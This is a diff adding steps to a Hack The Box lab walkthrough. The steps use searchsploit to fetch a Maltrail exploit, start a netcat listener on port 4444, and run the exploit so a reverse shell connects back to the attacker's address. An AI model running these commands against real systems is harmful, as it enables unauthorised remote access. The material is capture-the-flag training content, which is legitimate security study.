@@ -31,5 +31,27 @@ Run Exploit
 /51675.sh http://10.10.11.224:55555/ http://127.0.0.1:80/
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/21037b3a-2ebd-4701-97e3-716eab11b387)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5a3aa473-763c-4074-b1d5-82b081f3226f)
 
+Search Exploits
+```CSS
+searchsploit maltrail
 ```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4925095c-7d81-4c89-bfbc-b1a32a2c2a6c)
+
+Download Exploit
+```CSS
+searchsploit -m python/webapps/51676.py
+```
+
+Start Netcat Listener
+```CSS
+rlwrap nc -nlvvp 4444
+```
+
+Run Exploit
+```
+python3 51676.py 10.10.14.4 4444 http://10.10.11.224:55555/nmsxly
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d1f9fe95-40a3-4694-a9ef-ebf126e09f4f)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/3dde2cda-02a1-4206-92ef-1ee52146c66d)
